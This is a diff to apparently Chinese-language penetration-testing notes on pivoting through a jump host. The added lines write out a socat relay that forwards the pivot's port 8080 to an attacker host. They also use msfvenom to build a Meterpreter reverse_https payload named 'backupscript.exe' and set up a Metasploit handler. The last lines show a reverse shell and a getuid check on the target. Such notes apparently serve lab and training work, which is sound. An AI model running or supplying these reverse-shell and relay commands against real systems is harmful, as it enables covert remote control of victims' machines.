@@ -145,8 +145,18 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o bac
 meterpreter > shell      获得 反向 shell
 
 
-Socat 是一个双向中继工具，可以在 2 个独立的网络通道之间创建管道套接字，在本机监听，在跳板机上启动
+Socat 是一个双向中继工具，可以在 2 个独立的网络通道之间创建管道套接字，在跳板机上启动
   https://linux.die.net/man/1/socat
+跳板机:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80                                                        跳板机 8080 到攻击主机 10.10.14.18:80
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080      生成 反向playload
+sudo msfconsole -q
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+msf6 exploit(multi/handler) > set lport 80
+msf6 exploit(multi/handler) > run
+在目标运行 playload，可用 ssh
+meterpreter > getuid
 
 
 
